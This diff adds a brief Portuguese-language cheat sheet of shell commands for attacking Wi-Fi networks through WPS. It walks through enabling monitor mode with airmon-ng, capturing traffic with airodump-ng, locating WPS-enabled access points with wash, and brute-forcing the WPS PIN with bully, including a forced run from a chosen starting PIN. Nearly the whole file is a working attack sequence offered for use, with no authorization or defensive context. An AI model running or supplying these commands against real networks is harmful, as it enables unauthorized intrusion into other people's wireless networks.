@@ -1,0 +1,25 @@
+Linha de comando:
+
+Mostrando dispositivos de rede:
+
+# ifconfig
+
+Ativando interface de monitoramento:
+
+# airmon-ng start wlan0
+
+Monitorando o ar:
+
+# airodump-ng wlan0mon
+
+Encontrando redes com WPS ativo com Wash
+
+# wash -i wlan0mon
+
+Ataque WPS com Bully
+
+# bully -b <essid> -c <canal> wlan0mon
+
+Informando PIN inicial no Bully
+
+# bully -b <essid> -c <canal> -p <pin inicial> -B --force wlan0mon
